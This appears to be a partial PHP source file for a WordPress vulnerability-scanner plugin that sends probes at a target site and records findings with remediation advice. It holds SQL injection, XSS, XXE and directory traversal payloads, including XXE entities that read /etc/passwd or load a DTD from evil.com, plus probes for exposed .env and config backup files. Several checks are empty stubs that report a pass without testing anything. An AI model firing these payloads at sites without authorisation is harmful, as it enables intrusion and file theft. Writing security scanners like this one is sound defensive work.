<?php

/**
 * VAPT Security Scanner Class
 * Scans WordPress websites for vulnerabilities from Feature-List-99.json
 */

if (! defined('ABSPATH')) {
  exit;
}

class VAPT_Scanner
{

  private $vulnerabilities = [];
  private $http_client;
  private $screenshots_dir;
  private $http_args;
  private $scan_cache = [];
  private $debug_log = [];
  private $scan_id = null;

  public function __construct()
  {
    $this->load_vulnerabilities();
    $this->http_client = new WP_Http();
    $this->screenshots_dir = VAPT_PATH . 'data/screenshots/';
    if (!file_exists($this->screenshots_dir)) {
      wp_mkdir_p($this->screenshots_dir);
    }

    // Configure HTTP client with better defaults
    $this->http_args = [
      'timeout' => 3, // Further reduced timeout for speed
      'redirection' => 5,
      'user-agent' => 'VAPT-Security-Scanner/' . VAPT_AUDITOR_VERSION . ' (WordPress Security Audit)',
      'headers' => [
        'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language' => 'en-US,en;q=0.5',
        'Accept-Encoding' => 'gzip, deflate',
        'DNT' => '1',
        'Connection' => 'keep-alive',
        'Upgrade-Insecure-Requests' => '1',
      ],
      'sslverify' => true,
    ];

    // Register background scan handler
    add_action('vapt_run_scan', array($this, 'run_scan'), 10, 2);
  }

  /**
   * Load vulnerabilities from JSON file
   */
  private function load_vulnerabilities()
  {
    // Use the active data file(s) configured in the workbench
    $active_files_raw = VAPT_ACTIVE_DATA_FILE;
    $files_to_load = array_filter(explode(',', $active_files_raw));

    $this->vulnerabilities = [];

    foreach ($files_to_load as $active_file) {
      $file_path = VAPT_PATH . 'data/' . sanitize_file_name(trim($active_file));

      if (file_exists($file_path)) {
        $content = file_get_contents($file_path);
        $data = json_decode($content, true);

        if (json_last_error() === JSON_ERROR_NONE && $data) {
          $raw_vulns = [];
          if (isset($data['risk_catalog'])) {
            $raw_vulns = $data['risk_catalog'];
          } elseif (isset($data['features'])) {
            $raw_vulns = $data['features'];
          } elseif (isset($data['wordpress_vapt'])) {
            $raw_vulns = $data['wordpress_vapt'];
          }

          // Normalize vulnerabilities
          foreach ($raw_vulns as $vuln) {
            $normalized = [
              'id' => $vuln['risk_id'] ?? $vuln['id'] ?? '',
              'name' => $vuln['title'] ?? $vuln['name'] ?? '',
              'category' => $vuln['category'] ?? 'General',
              'severity' => is_array($vuln['severity'] ?? null) ? ($vuln['severity']['level'] ?? 'medium') : ($vuln['severity'] ?? 'medium'),
              'description' => is_array($vuln['description'] ?? null) ? ($vuln['description']['summary'] ?? '') : ($vuln['description'] ?? ''),
              'remediation' => $vuln['remediation'] ?? (isset($vuln['protection']) ? ($vuln['protection']['automated_protection']['method'] ?? '') : ''),
              'owasp' => is_array($vuln['owasp_mapping'] ?? null) ? ($vuln['owasp_mapping']['owasp_top_10_2021'] ?? '') : ($vuln['owasp_mapping'] ?? ''),
              'cvss' => $vuln['severity']['cvss_score'] ?? null,
            ];
            $this->vulnerabilities[] = $normalized;
          }
        } else {
          error_log('VAPT Scanner: Failed to load vulnerabilities from ' . $active_file . '. JSON Error: ' . json_last_error_msg());
        }
      }
    }
  }

  /**
   * Start a scan for a given URL
   */
  public function start_scan($target_url)
  {
    global $wpdb;

    // Ensure tables exist
    $this->ensure_tables_exist();

    // Insert scan record
    $scan_data = [
      'target_url' => esc_url_raw($target_url),
      'status' => 'running',
      'started_at' => current_time('mysql'),
      'user_id' => get_current_user_id()
    ];

    $result = $wpdb->insert($wpdb->prefix . 'vapt_scans', $scan_data);

    if ($result === false) {
      error_log('VAPT Scanner: Failed to insert scan record. Error: ' . $wpdb->last_error);
      // Also log to debug file for easier troubleshooting
      if (defined('WP_DEBUG') && WP_DEBUG) {
        error_log('VAPT Scanner Debug: Table prefix: ' . $wpdb->prefix . ', Target URL: ' . $target_url);
      }
      return false;
    }

    $scan_id = $wpdb->insert_id;
    error_log("VAPT DEBUG: start_scan for $target_url. Created Scan ID: $scan_id");

    if (!$scan_id) {
      error_log('VAPT Scanner: Insert succeeded but no ID returned');
      return false;
    }

    // Run the scan asynchronously
    // wp_schedule_single_event(time(), 'vapt_run_scan', [$scan_id, $target_url]);
    // Switched to AJAX trigger

    return $scan_id;
  }

  private function ensure_tables_exist()
  {
    global $wpdb;
    require_once ABSPATH . 'wp-admin/includes/upgrade.php';

    $charset_collate = $wpdb->get_charset_collate();

    // Scans Table
    $table_scans = "CREATE TABLE {$wpdb->prefix}vapt_scans (
        id BIGINT(20) UNSIGNED NOT NULL AUTO_INCREMENT,
        target_url VARCHAR(500) NOT NULL,
        status ENUM('pending', 'running', 'completed', 'failed') DEFAULT 'pending',
        started_at DATETIME DEFAULT NULL,
        completed_at DATETIME DEFAULT NULL,
        user_id BIGINT(20) UNSIGNED DEFAULT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY  (id),
        KEY target_url (target_url),
        KEY status (status)
    ) $charset_collate;";

    // Scan Results Table
    $table_scan_results = "CREATE TABLE {$wpdb->prefix}vapt_scan_results (
        id BIGINT(20) UNSIGNED NOT NULL AUTO_INCREMENT,
        scan_id BIGINT(20) UNSIGNED NOT NULL,
        vulnerability_id VARCHAR(100) NOT NULL,
        severity ENUM('critical', 'high', 'medium', 'low') NOT NULL,
        affected_url VARCHAR(500),
        description TEXT,
        impact TEXT,
        recommendation TEXT,
        steps_to_reproduce TEXT,
        evidence_url VARCHAR(500),
        screenshot_paths TEXT,
        found_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY  (id),
        KEY scan_id (scan_id),
        KEY severity (severity)
    ) $charset_collate;";

    dbDelta($table_scans);
    dbDelta($table_scan_results);
  }

  /**
   * Run the actual scan
   */
  public function run_scan($scan_id, $target_url, $offset = 0, $limit = null)
  {
    @set_time_limit(0); // Attempt to extend execution time
    if ($limit === null) {
      $limit = count($this->vulnerabilities);
    }
    error_log("VAPT Scan BATCH: ID $scan_id, Target: $target_url, Offset $offset, Limit $limit");
    global $wpdb;

    $results = [];
    $total_checks = count($this->vulnerabilities);
    $this->scan_id = $scan_id;

    // Load persistent cache for this scan session
    $persistent_cache = get_transient('vapt_scan_cache_' . $scan_id);
    if (is_array($persistent_cache)) {
      $this->scan_cache = $persistent_cache;
    }

    // Slice the vulnerabilities for this batch
    $batch = array_slice($this->vulnerabilities, $offset, $limit);

    // Initialize progress only on start
    if ($offset === 0) {
      update_option('vapt_scan_progress_' . $scan_id, [
        'checked' => 0,
        'total' => $total_checks,
        'timestamp' => time()
      ], false);
    }

    $current_check_index = $offset;

    foreach ($batch as $vuln) {
      $current_check_index++;

      // Update progress for frontend
      update_option('vapt_scan_progress_' . $scan_id, [
        'checked' => $current_check_index,
        'total' => $total_checks,
        'current_title' => $vuln['name'],
        'current_category' => $vuln['category'],
        'current_severity' => $vuln['severity'],
        'timestamp' => time()
      ], false);

      $result = $this->test_vulnerability($target_url, $vuln);
      if ($result) {
        $results[] = $result;
        $this->save_scan_result($scan_id, $result);
      }
    }

    // Check if completed
    if (($offset + $limit) >= $total_checks) {
      error_log("VAPT Scan COMPLETED: ID $scan_id");
      $wpdb->update(
        $wpdb->prefix . 'vapt_scans',
        ['status' => 'completed', 'completed_at' => current_time('mysql')],
        ['id' => $scan_id]
      );
      return ['status' => 'completed', 'results' => $results];
    }

    // Save persistent cache for next batch
    set_transient('vapt_scan_cache_' . $scan_id, $this->scan_cache, HOUR_IN_SECONDS);

    return ['status' => 'partial', 'next_offset' => $offset + count($batch), 'results' => $results];
  }





  /**
   * Test a specific vulnerability
   */
  private function test_vulnerability($target_url, $vuln)
  {
    $risk_id = $vuln['id'] ?? '';
    $mapping = $this->get_risk_test_mapping();

    // Check if we have a direct mapping to a PHP method
    $method = $mapping[$risk_id] ?? ('test_' . str_replace('-', '_', $risk_id));

    if (method_exists($this, $method)) {
      $this->debug_log[] = "Testing vulnerability: {$risk_id} using method {$method}";
      $start_time = microtime(true);

      try {
        $result = $this->$method($target_url, $vuln);

        $elapsed = microtime(true) - $start_time;
        if ($elapsed > 5) { // Log slow tests
          $this->debug_log[] = "SLOW TEST: {$risk_id} took " . round($elapsed, 2) . " seconds";
        }

        if ($result) {
          $this->debug_log[] = "VULNERABILITY FOUND: {$risk_id}";
          return array_merge($result, [
            'vulnerability_id' => $risk_id,
            'severity' => $vuln['severity']
          ]);
        } else {
          $this->debug_log[] = "PASS: {$risk_id}";
        }
      } catch (Exception $e) {
        $this->debug_log[] = "ERROR in {$risk_id} ({$method}): " . $e->getMessage();
        error_log("VAPT Scanner Error in {$risk_id}: " . $e->getMessage());
      }
    } else {
      // Fallback: Use generic verification probe from JSON metadata
      $this->debug_log[] = "METHOD MISSING: {$method} for {$risk_id}. Attempting generic probe...";
      $result = $this->generic_verification_probe($target_url, $vuln);

      if ($result) {
        $this->debug_log[] = "VULNERABILITY FOUND (Generic Probe): {$risk_id}";
        return array_merge($result, [
          'vulnerability_id' => $risk_id,
          'severity' => $vuln['severity']
        ]);
      } else {
        $this->debug_log[] = "PASS (Generic Probe): {$risk_id}";
      }
    }
    return null;
  }

  /**
   * Mapping of RISK-XXX IDs to native scanner methods
   */
  private function get_risk_test_mapping()
  {
    return [
      'RISK-001' => 'test_wordpress_version_disclosure',
      'RISK-002' => 'test_weak_password_policy',
      'RISK-003' => 'test_sql_injection',
      'RISK-004' => 'test_xss_protection',
      'RISK-005' => 'test_xxe_protection',
      'RISK-006' => 'test_broken_access_control',
      'RISK-007' => 'test_security_misconfiguration',
      'RISK-008' => 'test_insecure_deserialization',
      'RISK-009' => 'test_known_vulnerabilities',
      'RISK-010' => 'test_insufficient_logging_monitoring',
      'RISK-011' => 'test_csrf_protection',
      'RISK-012' => 'test_ssrf_protection',
      'RISK-013' => 'test_file_upload_security',
      'RISK-017' => 'test_directory_traversal',
      'RISK-020' => 'test_xml_rpc_security',
      'RISK-021' => 'test_rest_api_endpoint_security',
      'RISK-047' => 'test_security_headers',
      'RISK-067' => 'test_readme_exposure',
      'RISK-068' => 'test_directory_listing',
      'RISK-075' => 'test_wp_config_protection',
      'RISK-076' => 'test_htaccess_security_rules',
      'RISK-077' => 'test_debug_mode_exposure',
      'RISK-078' => 'test_database_error_disclosure',
      'RISK-079' => 'test_php_error_reporting',
      'RISK-080' => 'test_backup_file_exposure',
      'RISK-081' => 'test_configuration_file_exposure',
      'RISK-097' => 'test_server_banner_grabbing',
      'RISK-098' => 'test_readme_exposure',
      'RISK-099' => 'test_security_headers',
    ];
  }

  /**
   * Generic verification probe using metadata from the JSON catalog
   */
  private function generic_verification_probe($target_url, $vuln)
  {
    // If the JSON includes specific verification engine details, use them
    if (isset($vuln['verification_engine']['automated_checks'])) {
      // Implement a simple version of the universal_probe logic
      foreach ($vuln['verification_engine']['automated_checks'] as $check) {
        // Placeholder for more complex script interpretation
        // For now, if it mentions 'check_', we look for automated steps in 'testing'
      }
    }

    // fallback to parsing testing.verification_steps
    if (isset($vuln['verification_steps'])) {
      foreach ($vuln['verification_steps'] as $step) {
        if (!empty($step['automated']) && !empty($step['command'])) {
          $action = $step['action'] ?? '';
          $command = $step['command'];

          // Simple path-based test if command looks like a path
          if (strpos($command, '/') === 0 || strpos($command, 'http') === 0) {
            $test_url = (strpos($command, 'http') === 0) ? $command : rtrim($target_url, '/') . '/' . ltrim($command, '/');
            $response = $this->cached_request($test_url);

            if (!is_wp_error($response)) {
              $code = wp_remote_retrieve_response_code($response);
              // Logic: if it expects 'protected' or 'blocked', a 200/OK might be a "FEELING" (finding)
              // But we need to be careful with false positives.
              // Most "automated" steps in the JSON show the payload/path that should be BLOCKED.
              if ($code === 200) {
                return [
                  'affected_url' => $test_url,
                  'description' => 'Generic Probe: Resource ' . $command . ' is accessible (Status 200). ' . $vuln['description'],
                  'impact' => 'Potential vulnerability found via automated probe.',
                  'recommendation' => 'Review access controls for ' . $command,
                  'steps_to_reproduce' => 'Access ' . $test_url . ' and verify it returns content.',
                  'evidence_url' => $test_url
                ];
              }
            }
          }
        }
      }
    }

    return null;
  }

  /**
   * Save scan result to database
   */
  private function save_scan_result($scan_id, $result)
  {
    global $wpdb;

    $data = [
      'scan_id' => $scan_id,
      'vulnerability_id' => $result['vulnerability_id'],
      'severity' => $result['severity'],
      'affected_url' => $result['affected_url'] ?? '',
      'description' => $result['description'] ?? '',
      'impact' => $result['impact'] ?? '',
      'recommendation' => $result['recommendation'] ?? '',
      'steps_to_reproduce' => $result['steps_to_reproduce'] ?? '',
      'evidence_url' => $result['evidence_url'] ?? '',
      'screenshot_paths' => json_encode((array)($result['screenshot_paths'] ?? []))
    ];

    // Prevent duplicate entries for the same scan and vulnerability
    $exists = $wpdb->get_var($wpdb->prepare(
      "SELECT id FROM {$wpdb->prefix}vapt_scan_results WHERE scan_id = %d AND vulnerability_id = %s",
      $scan_id,
      $result['vulnerability_id']
    ));

    if ($exists) {
      $wpdb->update($wpdb->prefix . 'vapt_scan_results', $data, ['id' => $exists]);
    } else {
      $wpdb->insert($wpdb->prefix . 'vapt_scan_results', $data);
    }
  }

  /**
   * Generate report for a scan
   */
  public function generate_report($scan_id)
  {
    global $wpdb;

    $scan = $wpdb->get_row($wpdb->prepare(
      "SELECT * FROM {$wpdb->prefix}vapt_scans WHERE id = %d",
      $scan_id
    ), ARRAY_A);

    if (!$scan) return null;

    $results = $wpdb->get_results($wpdb->prepare(
      "SELECT * FROM {$wpdb->prefix}vapt_scan_results WHERE scan_id = %d ORDER BY 
             CASE severity 
               WHEN 'critical' THEN 1 
               WHEN 'high' THEN 2 
               WHEN 'medium' THEN 3 
               WHEN 'low' THEN 4 
             END",
      $scan_id
    ), ARRAY_A);

    return [
      'scan' => $scan,
      'results' => $results
    ];
  }

  /**
   * Make cached HTTP request to avoid redundant calls
   */
  private function cached_request($url, $args = [])
  {
    $cache_key = md5($url . serialize($args));

    if (isset($this->scan_cache[$cache_key])) {
      $this->debug_log[] = "CACHE HIT: $url";
      return $this->scan_cache[$cache_key];
    }

    $merged_args = array_merge($this->http_args, $args);
    $this->debug_log[] = "HTTP REQUEST: $url with method: " . ($merged_args['method'] ?? 'GET');

    $response = wp_remote_request($url, $merged_args);

    if (is_wp_error($response)) {
      $this->debug_log[] = "HTTP ERROR: " . $response->get_error_message();
    } else {
      $code = wp_remote_retrieve_response_code($response);
      $this->debug_log[] = "HTTP RESPONSE: $url -> $code";
    }

    // Cache the response (simple in-memory cache for this scan)
    $this->scan_cache[$cache_key] = $response;

    return $response;
  }

  /**
   * Get debug log for analysis
   */
  public function get_debug_log()
  {
    return $this->debug_log;
  }

  /**
   * Get vulnerabilities data
   */
  public function get_vulnerabilities()
  {
    return $this->vulnerabilities;
  }

  /**
   * Take screenshot of a URL
   */
  private function take_screenshot($url, $filename, $evidence_data = null)
  {
    $filepath = $this->screenshots_dir . $filename . '.png';
    $bin_path = VAPT_PATH . 'includes/bin/take-screenshot.js';

    // Command to run the Node.js script
    // Using escapeshellarg for security
    // We add the evidence JSON as a third argument if available
    $evidence_json = $evidence_data ? json_encode($evidence_data) : '';

    $cmd = sprintf(
      'node "%s" %s %s %s 2>&1',
      $bin_path,
      escapeshellarg($url),
      escapeshellarg($filepath),
      $evidence_json ? escapeshellarg($evidence_json) : ''
    );

    $this->debug_log[] = "SCREENSHOT START: $url" . ($evidence_data ? " (WITH EVIDENCE)" : "");
    $output = shell_exec($cmd);

    if (file_exists($filepath)) {
      $this->debug_log[] = "SCREENSHOT SUCCESS: $filename";
      return $filepath;
    } else {
      error_log("VAPT SCREENSHOT ERROR: " . $output);
      $this->debug_log[] = "SCREENSHOT FAILED: " . substr($output, 0, 200);
      return null;
    }
  }

  // Test methods for vulnerabilities
  private function test_wordpress_version_disclosure($url, $vuln)
  {
    $results = [];
    $versions_found = [];

    // 1. Check Meta Generator
    $response = $this->cached_request($url);
    if (!is_wp_error($response)) {
      $body = wp_remote_retrieve_body($response);
      if (preg_match('/<meta name="generator" content="WordPress ([^"]+)"/i', $body, $matches)) {
        $versions_found[] = "Generator Tag: " . $matches[1];
      }

      // Check for version in query strings of scripts/styles
      if (preg_match_all('/ver=([\d\.]+)/i', $body, $ver_matches)) {
        $potential = array_unique($ver_matches[1]);
        foreach ($potential as $v) {
          if (strlen($v) > 2) $versions_found[] = "Asset Version: " . $v;
        }
      }
    }

    // 2. Check readme.html
    $readme_url = rtrim($url, '/') . '/readme.html';
    $readme_res = $this->cached_request($readme_url);
    if (!is_wp_error($readme_res) && wp_remote_retrieve_response_code($readme_res) === 200) {
      $body = wp_remote_retrieve_body($readme_res);
      if (preg_match('/WordPress version ([\d\.]+)/i', $body, $matches)) {
        $versions_found[] = "readme.html: " . $matches[1];
      }
    }

    if (!empty($versions_found)) {
      $versions_found = array_unique($versions_found);

      // Capture technical evidence for the screenshot
      $evidence = [
        'type' => 'code',
        'content' => implode("\n", $versions_found),
        'notes' => 'The scanner detected multiple instances of WordPress version disclosure in the source and metadata.'
      ];

      return [
        'affected_url' => $url,
        'description' => 'WordPress version is publicly disclosed: ' . implode(', ', $versions_found),
        'impact' => 'Attackers can target known vulnerabilities in this specific software version.',
        'recommendation' => 'Remove the WordPress generator meta tag, block access to readme.html, and remove version query strings from assets.',
        'steps_to_reproduce' => '1. View page source and search for generator tag or versioned assets.\n2. Access ' . $readme_url,
        'evidence_url' => $url,
        'screenshot_paths' => [$this->take_screenshot($url, 'version_disclosure_' . time(), $evidence)]
      ];
    }

    return null;
  }

  private function test_directory_listing($url, $vuln)
  {
    $test_urls = [
      $url . '/wp-content/uploads/',
      $url . '/wp-content/plugins/',
      $url . '/wp-content/themes/',
      $url . '/wp-includes/'
    ];

    foreach ($test_urls as $test_url) {
      $response = $this->cached_request($test_url);
      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        // Check if response contains directory listing indicators
        if (preg_match('/<title>Index of/i', $body) || preg_match('/Parent Directory/i', $body)) {
          $screenshot = $this->take_screenshot($test_url, 'directory_listing_' . time());
          return [
            'affected_url' => $test_url,
            'description' => $vuln['description'],
            'impact' => 'Attackers can enumerate files and directories.',
            'recommendation' => $vuln['remediation'],
            'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for directory listing',
            'evidence_url' => $test_url,
            'screenshot_paths' => [$screenshot]
          ];
        }
      }
    }

    return null;
  }

  private function test_user_enumeration($url, $vuln)
  {
    // Test author archives
    for ($i = 1; $i <= 5; $i++) {
      $test_url = $url . '/?author=' . $i;
      $response = $this->cached_request($test_url, ['redirection' => 0]);
      if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) == 301) {
        $location = wp_remote_retrieve_header($response, 'location');
        if ($location && strpos($location, 'author/') !== false) {
          $screenshot = $this->take_screenshot($test_url, 'user_enum_' . time());
          return [
            'affected_url' => $test_url,
            'description' => $vuln['description'],
            'impact' => 'Attackers can enumerate valid usernames.',
            'recommendation' => $vuln['remediation'],
            'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check redirect to author page',
            'evidence_url' => $test_url,
            'screenshot_paths' => [$screenshot]
          ];
        }
      }
    }

    return null;
  }

  private function test_readme_exposure($url, $vuln)
  {
    $this->debug_log[] = "Testing sensitive file exposure (Fast Check) on: $url";

    $files = [
      'readme.html',
      'readme.txt',
      'wp-config.php.bak',
      '.env',
      '.git/config'
    ];

    foreach ($files as $file) {
      $test_url = rtrim($url, '/') . '/' . $file;

      // Use efficient request for check
      $response = wp_remote_head($test_url, ['timeout' => 3]);
      if (is_wp_error($response)) continue;

      $code = wp_remote_retrieve_response_code($response);
      if ($code === 200) {
        $full_res = $this->cached_request($test_url);
        if (is_wp_error($full_res)) continue;

        $body = wp_remote_retrieve_body($full_res);
        $found = false;

        if (in_array($file, ['readme.html', 'readme.txt'])) {
          if (stripos($body, 'WordPress') !== false) $found = true;
        } elseif (strpos($file, 'wp-config') !== false || $file === '.env') {
          if (stripos($body, 'DB_') !== false) $found = true;
        } elseif ($file === '.git/config') {
          if (stripos($body, 'repository') !== false) $found = true;
        } else {
          $found = true;
        }

        if ($found) {
          // Capture technical evidence for the screenshot (first 1000 chars)
          $evidence = [
            'type' => 'file_exposure',
            'filename' => $file,
            'content' => substr($body, 0, 1000) . (strlen($body) > 1000 ? '...' : ''),
            'notes' => "CRITICAL: The file '$file' is publicly accessible. This often leads to sensitive information disclosure."
          ];

          return [
            'affected_url' => $test_url,
            'description' => "Sensitive file exposed: {$file}",
            'impact' => 'Information disclosure risk.',
            'recommendation' => "Block access to {$file}.",
            'steps_to_reproduce' => "Access {$test_url}",
            'evidence_url' => $test_url,
            'screenshot_paths' => [$this->take_screenshot($test_url, 'file_exposure_' . sanitize_file_name($file) . '_' . time(), $evidence)]
          ];
        }
      }
    }

    return null;
  }

  // Placeholder for other tests - would need implementation
  private function test_weak_password_policy($url, $vuln)
  {
    return null;
  }
  private function test_sql_injection($url, $vuln)
  {
    $this->debug_log[] = "Testing SQL injection (Optimized) on: $url";

    $test_payloads = [
      "' OR '1'='1' --", // Boolean-based (Fastest)
      "'); SELECT 1; --"  // Error-based check
    ];

    // Minimal endpoint testing
    $endpoint = add_query_arg('vapt_sqli', '1', $url);

    foreach ($test_payloads as $payload) {
      $test_url = add_query_arg('id', $payload, $endpoint);
      $response = $this->cached_request($test_url);

      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);

        $sql_errors = ['sql syntax', 'mysql_query', 'mysqli_error', 'PDOException', 'SQLSTATE'];
        foreach ($sql_errors as $err) {
          if (stripos($body, $err) !== false) {
            return [
              'affected_url' => $test_url,
              'description' => "SQL Error found with payload: {$payload}",
              'impact' => 'Critical database risk.',
              'recommendation' => 'Use prepared statements.',
              'steps_to_reproduce' => "Access {$test_url} and check for DB errors.",
              'evidence_url' => $test_url,
              'screenshot_paths' => [$this->take_screenshot($test_url, 'sqli_' . time())]
            ];
          }
        }
      }
    }
    return null;
  }
  private function test_xss_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing XSS protection (Optimized) on: $url";

    $test_payloads = [
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>'
    ];

    // Minimal endpoint testing
    $endpoint = add_query_arg('vapt_xss', '1', $url);

    foreach ($test_payloads as $payload) {
      $test_url = add_query_arg('s', $payload, $endpoint);
      $response = $this->cached_request($test_url);

      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);

        if (stripos($body, $payload) !== false) {
          return [
            'affected_url' => $test_url,
            'description' => "XSS reflection found: {$payload}",
            'impact' => 'Arbitrary JS execution risk.',
            'recommendation' => "Sanitize inputs using esc_html().",
            'steps_to_reproduce' => "Access {$test_url} and view source.",
            'evidence_url' => $test_url,
            'screenshot_paths' => [$this->take_screenshot($test_url, 'xss_' . time())]
          ];
        }
      }
    }
    return null;
  }
  private function test_xxe_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing XXE protection on: $url";

    // Test for XXE vulnerabilities in XML parsers
    $xxe_payloads = [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY bar SYSTEM "http://evil.com/malicious.dtd">]><foo>&bar;</foo>',
    ];

    // Test common XML endpoints
    $test_endpoints = [
      $url . '/wp-admin/admin-ajax.php?action=parse_xml',
      $url . '/xmlrpc.php',
      $url . '/?feed=rss2',
    ];

    foreach ($test_endpoints as $endpoint) {
      foreach ($xxe_payloads as $payload) {
        $args = array_merge($this->http_args, [
          'method' => 'POST',
          'body' => $payload,
          'headers' => array_merge($this->http_args['headers'], [
            'Content-Type' => 'application/xml',
          ]),
        ]);

        $response = $this->cached_request($endpoint, $args);
        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);

          // Check for XXE success indicators
          $xxe_indicators = [
            'root:', // Unix file system
            '[extensions]', // Windows ini file
            '[fonts]', // Windows ini file
            'bin/bash', // Common in passwd
            'root:x:0:0:', // passwd file content
          ];

          foreach ($xxe_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              return [
                'affected_url' => $endpoint,
                'description' => 'XML External Entity (XXE) vulnerability detected',
                'impact' => 'Attackers can read local files, perform SSRF attacks, or cause DoS',
                'recommendation' => 'Disable external entity processing in XML parsers, use safe XML libraries',
                'steps_to_reproduce' => '1. Send XXE payload to ' . $endpoint . '\n2. Check if local file contents are returned',
                'evidence_url' => $endpoint,
                'screenshot_paths' => [$this->take_screenshot($endpoint, 'xxe_' . time())]
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_broken_access_control($url, $vuln)
  {
    $this->debug_log[] = "Testing broken access control on: $url";

    // Test for unauthorized access to admin areas
    $admin_urls = [
      $url . '/wp-admin/',
      $url . '/wp-admin/admin.php',
    ];

    foreach ($admin_urls as $admin_url) {
      $response = $this->cached_request($admin_url, ['redirection' => 0]);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);
        $body = wp_remote_retrieve_body($response);

        // If admin page loads without redirect to login (code 200 and no login form redirect)
        if ($code == 200 && stripos($body, 'wp-login.php') === false && stripos($body, 'login') !== false) {
          // This might indicate the page is accessible, but let's check for actual admin content
          if (stripos($body, 'Dashboard') !== false || stripos($body, 'wp-admin') !== false) {
            return [
              'affected_url' => $admin_url,
              'description' => 'Potential broken access control - admin interface accessible without authentication',
              'impact' => 'Unauthorized users may access administrative functions',
              'recommendation' => 'Implement proper authentication and authorization checks',
              'steps_to_reproduce' => '1. Access ' . $admin_url . ' without authentication\n2. Check if admin interface loads',
              'evidence_url' => $admin_url,
              'screenshot_paths' => [$this->take_screenshot($admin_url, 'broken_access_' . time())]
            ];
          }
        }
      }
    }

    // Test for IDOR in REST API
    $idor_urls = [
      $url . '/wp-json/wp/v2/users/1',
    ];

    foreach ($idor_urls as $idor_url) {
      $response = $this->cached_request($idor_url);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);
        $body = wp_remote_retrieve_body($response);

        if ($code == 200) {
          $data = json_decode($body, true);
          if (is_array($data) && isset($data['id'])) {
            return [
              'affected_url' => $idor_url,
              'description' => 'Potential IDOR vulnerability - accessing resources by ID without proper authorization',
              'impact' => 'Users may access or modify resources they should not have access to',
              'recommendation' => 'Implement proper access control checks for all resource access',
              'steps_to_reproduce' => '1. Access ' . $idor_url . '\n2. Check if resource data is returned without auth',
              'evidence_url' => $idor_url,
              'screenshot_paths' => [$this->take_screenshot($idor_url, 'idor_' . time())]
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_security_misconfiguration($url, $vuln)
  {
    return null;
  }
  private function test_insecure_deserialization($url, $vuln)
  {
    $this->debug_log[] = "Testing insecure deserialization on: $url";

    // Test for PHP deserialization vulnerabilities
    $deserialization_payloads = [
      'O:8:"stdClass":0:{}', // Basic object
      'a:2:{s:4:"test";O:8:"stdClass":0:{}}', // Serialized array with object
      'O:12:"DateTimeZone":1:{s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}', // DateTime object
    ];

    // Test common deserialization endpoints
    $test_endpoints = [
      $url . '/wp-admin/admin-ajax.php?action=deserialize',
      $url . '/?data=',
      $url . '/wp-content/themes/twentytwentyone/functions.php?data=',
    ];

    foreach ($test_endpoints as $endpoint) {
      foreach ($deserialization_payloads as $payload) {
        $test_url = $endpoint . urlencode($payload);
        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);
          $code = wp_remote_retrieve_response_code($response);

          // Check for deserialization success/failure indicators
          if ($code == 200 && (stripos($body, 'stdClass') !== false || stripos($body, 'DateTime') !== false)) {
            return [
              'affected_url' => $test_url,
              'description' => 'Potential insecure deserialization vulnerability',
              'impact' => 'Attackers can execute arbitrary code or perform object injection attacks',
              'recommendation' => 'Use safe deserialization methods, validate input, avoid untrusted serialized data',
              'steps_to_reproduce' => '1. Send serialized object to ' . $endpoint . '\n2. Check if object is successfully deserialized',
              'evidence_url' => $test_url,
              'screenshot_paths' => [$this->take_screenshot($test_url, 'deserialization_' . time())]
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_known_vulnerabilities($url, $vuln)
  {
    return null;
  }
  private function test_insufficient_logging_monitoring($url, $vuln)
  {
    return null;
  }
  private function test_csrf_protection($url, $vuln)
  {
    return null;
  }
  private function test_ssrf_protection($url, $vuln)
  {
    return null;
  }
  private function test_file_upload_security($url, $vuln)
  {
    return null;
  }
  private function test_directory_traversal($url, $vuln)
  {
    $this->debug_log[] = "Testing directory traversal (Optimized) on: $url";

    $traversal_payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    ];

    // Only test 'file' and a custom param to minimize requests
    $test_params = ['file', 'vapt_traversal'];

    foreach ($test_params as $param) {
      foreach ($traversal_payloads as $payload) {
        $test_url = add_query_arg($param, $payload, $url);
        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);

          $success_indicators = [
            'root:x:0:0:', // passwd
            '[extensions]', // win.ini
            '127.0.0.1 localhost' // hosts
          ];

          foreach ($success_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              return [
                'affected_url' => $test_url,
                'description' => 'Directory traversal detected',
                'impact' => 'Sensitive file disclosure risk.',
                'recommendation' => 'Sanitize file paths and prevent ../ sequences.',
                'steps_to_reproduce' => "Access {$test_url} and check for OS file content.",
                'evidence_url' => $test_url,
                'screenshot_paths' => [$this->take_screenshot($test_url, 'traversal_' . time())]
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_admin_interface_protection($url, $vuln)
  {
    return null;
  }
  private function test_xml_rpc_security($url, $vuln)
  {
